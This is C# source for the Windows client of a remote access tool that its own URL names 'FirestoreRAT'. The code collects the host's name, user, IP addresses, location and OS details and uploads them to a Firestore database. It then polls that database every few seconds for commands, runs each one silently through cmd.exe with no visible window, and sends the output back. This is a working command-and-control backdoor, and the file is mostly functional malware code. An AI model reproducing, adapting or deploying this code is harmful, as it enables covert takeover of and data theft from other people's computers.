using Google.Cloud.Firestore;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows;
using Timer = System.Timers.Timer;

namespace ClientFirestore
{
    public partial class MainWindow : Window
    {
        // ====== Firestore ======
        private FirestoreDb Db => FirestoreProvider.Db;

        private string _pcKey;
        private Timer _pingPollTimer;
        private string _lastPingToken = "";

        private Timer _adminOpenPoll;
        private bool _chatBrowserOpen = false;

        private Timer _cmdPollTimer;
        private string _lastCmdId = "";

        private Timer _internetCheckTimer;
        private bool _isInitialized = false;

        // ВАЖНО: URL с .html
        private const string CHAT_URL = "https://bibonuwu.github.io/FirestoreRAT/chat.html";

        private DocumentReference PcDoc =>
            string.IsNullOrEmpty(_pcKey)
                ? null
                : Db.Collection("pcList").Document(_pcKey);

        private DocumentReference CmdDoc =>
            PcDoc?.Collection("command").Document("current");

        private const string IPINFO_TOKEN = "";

        public MainWindow()
        {
            InitializeComponent();
            Closing += Window_Closing;
            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
        }

        // ================= ОТКРЫТИЕ ЧАТА В БРАУЗЕРЕ =================

        private void OpenChatInBrowser()
        {
            if (_chatBrowserOpen) return;

            try
            {
                string userName = Uri.EscapeDataString(Environment.UserName);
                string pcKey = Uri.EscapeDataString(_pcKey ?? "");
                string url = $"{CHAT_URL}?pcKey={pcKey}&userName={userName}";

                string browserPath = GetDefaultBrowserPath();

                if (!string.IsNullOrEmpty(browserPath))
                {
                    // Запускаем браузер напрямую — без диалога выбора
                    System.Diagnostics.Process.Start(browserPath, url);
                }
                else
                {
                    // Фоллбэк: пробуем стандартные браузеры
                    string[] browsers = new[]
                    {
                        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                        @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                        @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                        @"C:\Program Files\Mozilla Firefox\firefox.exe"
                    };

                    foreach (var b in browsers)
                    {
                        if (System.IO.File.Exists(b))
                        {
                            System.Diagnostics.Process.Start(b, url);
                            _chatBrowserOpen = true;
                            return;
                        }
                    }

                    // Последний вариант
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = url,
                        UseShellExecute = true
                    });
                }

                _chatBrowserOpen = true;
            }
            catch (Exception)
            {
            }
        }

        private static string GetDefaultBrowserPath()
        {
            try
            {
                // Читаем ProgId браузера по умолчанию
                using (var userChoice = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"))
                {
                    if (userChoice == null) return null;
                    string progId = userChoice.GetValue("ProgId")?.ToString();
                    if (string.IsNullOrEmpty(progId)) return null;

                    // По ProgId находим путь к exe
                    using (var cmdKey = Registry.ClassesRoot.OpenSubKey($@"{progId}\shell\open\command"))
                    {
                        if (cmdKey == null) return null;
                        string cmd = cmdKey.GetValue(null)?.ToString();
                        if (string.IsNullOrEmpty(cmd)) return null;

                        // Извлекаем путь из строки вида: "C:\...\chrome.exe" --args
                        if (cmd.StartsWith("\""))
                        {
                            int end = cmd.IndexOf("\"", 1);
                            if (end > 1) return cmd.Substring(1, end - 1);
                        }
                        else
                        {
                            int space = cmd.IndexOf(" ");
                            return space > 0 ? cmd.Substring(0, space) : cmd;
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        // ================= ПРОВЕРКА ИНТЕРНЕТА =================

        private async Task<bool> CheckInternetConnectionAsync()
        {
            try
            {
                if (!NetworkInterface.GetIsNetworkAvailable())
                    return false;

                using (var ping = new Ping())
                {
                    var reply = await ping.SendPingAsync("8.8.8.8", 2000);
                    if (reply?.Status != IPStatus.Success)
                        return false;
                }

                using (var httpClient = new HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(3);
                    var response = await httpClient.GetAsync("http://www.google.com/generate_204");
                    return response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.NoContent;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task WaitForInternetAsync(CancellationToken cancellationToken = default)
        {
            while (!await CheckInternetConnectionAsync())
            {
                if (cancellationToken.IsCancellationRequested)
                    throw new TaskCanceledException();
                await Task.Delay(5000, cancellationToken);
            }
        }

        // ================= ОСНОВНОЙ ПРОЦЕСС ЗАГРУЗКИ =================

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _ = InitializeApplicationAsync();
        }

        private async Task InitializeApplicationAsync()
        {
            try
            {
                await WaitForInternetAsync();

                await ExecuteWithInternetRetryAsync(async () =>
                {
                    await RegisterAsync();
                    await SetOnlineAsync(true);
                });

                await Dispatcher.InvokeAsync(() =>
                {
                    _isInitialized = true;
                    StartPingPoll();
                    StartCmdPoll();
                    StartAdminOpenWatcher();
                });
            }
            catch (Exception ex)
            {
                await Dispatcher.InvokeAsync(() => { });
            }
        }

        // ================= ОБЕРТКА ДЛЯ ОПЕРАЦИЙ С ИНТЕРНЕТОМ =================

        private async Task ExecuteWithInternetRetryAsync(Func<Task> action, int maxRetries = 3)
        {
            int retryCount = 0;
            while (retryCount < maxRetries)
            {
                try
                {
                    if (!await CheckInternetConnectionAsync())
                        await WaitForInternetAsync();

                    await action();
                    return;
                }
                catch (Exception ex) when (IsNetworkException(ex))
                {
                    retryCount++;
                    if (retryCount >= maxRetries) throw;
                    int delay = 1000 * (int)Math.Pow(2, retryCount);
                    await Task.Delay(delay);
                }
            }
        }

        private bool IsNetworkException(Exception ex)
        {
            return ex is HttpRequestException ||
                   ex is TaskCanceledException ||
                   ex is PingException ||
                   ex is SocketException;
        }

        private async void Repeat_Click(object sender, RoutedEventArgs e)
        {
            await ExecuteWithInternetRetryAsync(async () =>
            {
                await RegisterAsync();
                await SetOnlineAsync(true);
            });
        }

        // ================= ВСПОМОГАТЕЛЬНЫЕ =================

        private static string NowLocal() => DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");

        private static string GetLocalIp()
        {
            try
            {
                foreach (var ni in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (ni.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ni))
                    {
                        var s = ni.ToString();
                        if (!s.StartsWith("169.254")) return s;
                    }
                }
            }
            catch { }
            return "";
        }

        private class IpInfo
        {
            public string ip { get; set; }
            public string city { get; set; }
            public string region { get; set; }
            public string country { get; set; }
        }

        private static async Task<IpInfo> FetchIpInfoAsync(string token)
        {
            string url = "https://ipinfo.io/json";
            if (!string.IsNullOrEmpty(token)) url += "?token=" + token;

            using (var http = new HttpClient())
            {
                var json = await http.GetStringAsync(url);
                return System.Text.Json.JsonSerializer.Deserialize<IpInfo>(json);
            }
        }

        private static async Task<string> FallbackPublicIpAsync()
        {
            using (var http = new HttpClient())
            {
                try { return (await http.GetStringAsync("https://api.ipify.org")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://checkip.amazonaws.com")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://ifconfig.me/ip")).Trim(); } catch { }
            }
            throw new Exception("Не удалось определить внешний IP.");
        }

        // ================ РЕГИСТРАЦИЯ В Firestore ===================

        private async Task RegisterAsync()
        {
            try
            {
                if (!await CheckInternetConnectionAsync())
                    throw new HttpRequestException("Нет интернет-соединения");

                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string localIp = GetLocalIp();

                var ipinfo = await FetchIpInfoAsync(IPINFO_TOKEN) ?? new IpInfo();
                string internetIp = !string.IsNullOrEmpty(ipinfo.ip)
                    ? ipinfo.ip
                    : await FallbackPublicIpAsync();

                string osName = GetWindowsFriendlyName();
                string osBuild = GetWindowsBuild();
                string osArchitecture = RuntimeInformation.OSArchitecture.ToString();
                string processArchitecture = RuntimeInformation.ProcessArchitecture.ToString();
                string framework = RuntimeInformation.FrameworkDescription;

                _pcKey = "PC_" + pcName.Replace(".", "_") + "_" + userName.Replace(".", "_");

                var systemMap = new
                {
                    pcName,
                    userName,
                    localIp,
                    internetIp,
                    country = ipinfo.country ?? "",
                    region = ipinfo.region ?? "",
                    city = ipinfo.city ?? "",
                    osName,
                    osBuild,
                    osArchitecture,
                    processArchitecture,
                    framework
                };

                var onlineMap = new
                {
                    pcOnline = 1,
                    startTime = NowLocal()
                };

                await PcDoc.SetAsync(new
                {
                    system = systemMap,
                    online = onlineMap
                }, SetOptions.MergeAll);
            }
            catch (Exception)
            {
                throw;
            }
        }

        private string GetWindowsFriendlyName()
        {
            try
            {
                RegistryKey baseKey = RegistryKey.OpenBaseKey(
                    RegistryHive.LocalMachine,
                    Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);

                using (baseKey)
                using (RegistryKey key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key == null) return RuntimeInformation.OSDescription;

                    string productName = key.GetValue("ProductName")?.ToString().Trim() ?? "";
                    string displayVersion = key.GetValue("DisplayVersion")?.ToString().Trim() ?? "";
                    string releaseId = key.GetValue("ReleaseId")?.ToString().Trim() ?? "";

                    string versionPart = !string.IsNullOrWhiteSpace(displayVersion) ? displayVersion : releaseId;

                    if (!string.IsNullOrWhiteSpace(productName) && !string.IsNullOrWhiteSpace(versionPart))
                        return productName + " " + versionPart;
                    if (!string.IsNullOrWhiteSpace(productName))
                        return productName;

                    return RuntimeInformation.OSDescription;
                }
            }
            catch { return RuntimeInformation.OSDescription; }
        }

        private string GetWindowsBuild()
        {
            try
            {
                RegistryKey baseKey = RegistryKey.OpenBaseKey(
                    RegistryHive.LocalMachine,
                    Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);

                using (baseKey)
                using (RegistryKey key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key == null) return Environment.OSVersion.Version.ToString();

                    string currentBuild = key.GetValue("CurrentBuild")?.ToString().Trim() ?? "";
                    if (string.IsNullOrWhiteSpace(currentBuild))
                        currentBuild = key.GetValue("CurrentBuildNumber")?.ToString().Trim() ?? "";

                    string ubr = key.GetValue("UBR")?.ToString().Trim() ?? "";

                    if (!string.IsNullOrWhiteSpace(currentBuild) && !string.IsNullOrWhiteSpace(ubr))
                        return currentBuild + "." + ubr;
                    if (!string.IsNullOrWhiteSpace(currentBuild))
                        return currentBuild;

                    return Environment.OSVersion.Version.ToString();
                }
            }
            catch { return Environment.OSVersion.Version.ToString(); }
        }

        // ================ ONLINE/OFFLINE + PING ===================

        private async Task SetOnlineAsync(bool online)
        {
            if (PcDoc == null) return;

            if (!await CheckInternetConnectionAsync())
                throw new HttpRequestException("Нет интернет-соединения");

            if (online)
            {
                await PcDoc.UpdateAsync(new Dictionary<string, object>
                {
                    ["online.pcOnline"] = 1,
                    ["online.startTime"] = NowLocal()
                });
            }
            else
            {
                await PcDoc.UpdateAsync(new Dictionary<string, object>
                {
                    ["online.pcOnline"] = 0,
                    ["online.stopTime"] = NowLocal()
                });
            }
        }

        private void StartPingPoll()
        {
            _pingPollTimer?.Stop();
            _pingPollTimer?.Dispose();

            _pingPollTimer = new Timer(2000) { AutoReset = true };
            _pingPollTimer.Elapsed += async (_, __) => await PollPingAsync();
            _pingPollTimer.Start();
        }

        private async Task PollPingAsync()
        {
            if (PcDoc == null || !_isInitialized) return;
            if (!await CheckInternetConnectionAsync()) return;

            try
            {
                var snap = await PcDoc.GetSnapshotAsync();
                if (!snap.Exists || !snap.ContainsField("online.ping")) return;

                var token = snap.GetValue<string>("online.ping") ?? "";
                if (string.IsNullOrEmpty(token) || token == _lastPingToken) return;

                await PcDoc.UpdateAsync("online.pong", token);
                _lastPingToken = token;
            }
            catch (HttpRequestException) { }
            catch (Exception) { }
        }

        // =================== WATCH AdminOpen =================

        private void StartAdminOpenWatcher()
        {
            _adminOpenPoll?.Stop();
            _adminOpenPoll?.Dispose();

            _adminOpenPoll = new Timer(1000) { AutoReset = true };
            _adminOpenPoll.Elapsed += async (_, __) =>
            {
                if (PcDoc == null || !_isInitialized) return;
                if (!await CheckInternetConnectionAsync()) return;

                try
                {
                    var snap = await PcDoc.GetSnapshotAsync();
                    if (!snap.Exists) return;

                    int adminOpen = snap.ContainsField("adminOpen")
                        ? snap.GetValue<int>("adminOpen")
                        : 0;

                    Dispatcher.Invoke(() =>
                    {
                        if (adminOpen == 1)
                            OpenChatInBrowser();
                        else
                            _chatBrowserOpen = false;
                    });
                }
                catch { }
            };
            _adminOpenPoll.Start();
        }

        // =================== КОМАНДЫ CMD =======================

        private void StartCmdPoll()
        {
            _cmdPollTimer?.Stop();
            _cmdPollTimer?.Dispose();

            _cmdPollTimer = new Timer(1500) { AutoReset = true };
            _cmdPollTimer.Elapsed += async (_, __) => await PollCommandAsync();
            _cmdPollTimer.Start();
        }

        private static async Task<(int exitCode, string stdout, string stderr)> RunCommandAsync(string cmd)
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c chcp 65001>nul & " + cmd,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };

            using (var p = System.Diagnostics.Process.Start(psi))
            {
                string stdout = await p.StandardOutput.ReadToEndAsync();
                string stderr = await p.StandardError.ReadToEndAsync();
                await Task.Run(() => p.WaitForExit());
                return (p.ExitCode, stdout, stderr);
            }
        }

        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return "";
            if (s.Length <= max) return s;
            return s.Substring(0, max) + "\n... [truncated]";
        }

        private async Task PollCommandAsync()
        {
            if (CmdDoc == null || !_isInitialized) return;
            if (!await CheckInternetConnectionAsync()) return;

            try
            {
                var snap = await CmdDoc.GetSnapshotAsync();
                if (!snap.Exists) return;

                var data = snap.ToDictionary() ?? new Dictionary<string, object>();

                string id = data.ContainsKey("id") ? Convert.ToString(data["id"]) : "";
                string cmdText = data.ContainsKey("cmd") ? Convert.ToString(data["cmd"]) : "";
                string status = data.ContainsKey("status") ? Convert.ToString(data["status"]) : "new";

                if (string.IsNullOrWhiteSpace(id) || string.IsNullOrWhiteSpace(cmdText)) return;
                if (status != "new") return;
                if (id == _lastCmdId) return;

                _lastCmdId = id;

                await CmdDoc.UpdateAsync(new Dictionary<string, object>
                {
                    ["status"] = "running",
                    ["worker"] = _pcKey
                });

                int exitCode = -1;
                string stdout = "", stderr = "";
                try
                {
                    var r = await RunCommandAsync(cmdText);
                    exitCode = r.exitCode;
                    stdout = r.stdout;
                    stderr = r.stderr;
                }
                catch (Exception ex)
                {
                    stderr = ex.Message;
                }

                if (await CheckInternetConnectionAsync())
                {
                    await CmdDoc.UpdateAsync(new Dictionary<string, object>
                    {
                        ["status"] = "done",
                        ["exitCode"] = exitCode,
                        ["stdout"] = Trunc(stdout, 60000),
                        ["stderr"] = Trunc(stderr, 60000),
                        ["cmd"] = cmdText,
                        ["id"] = id,
                        ["worker"] = _pcKey
                    });
                }
            }
            catch (HttpRequestException) { }
            catch (Exception) { }
        }

        // =================== ЗАКРЫТИЕ =======================

        private async void Window_Closing(object sender, CancelEventArgs e)
        {
            try
            {
                _pingPollTimer?.Stop();
                _pingPollTimer?.Dispose();
                _cmdPollTimer?.Stop();
                _cmdPollTimer?.Dispose();
                _adminOpenPoll?.Stop();
                _adminOpenPoll?.Dispose();
                await SetOnlineAsync(false);
            }
            catch { }
        }

        private async void OnProcessExit(object sender, EventArgs e)
        {
            try { await SetOnlineAsync(false); } catch { }
        }
    }
}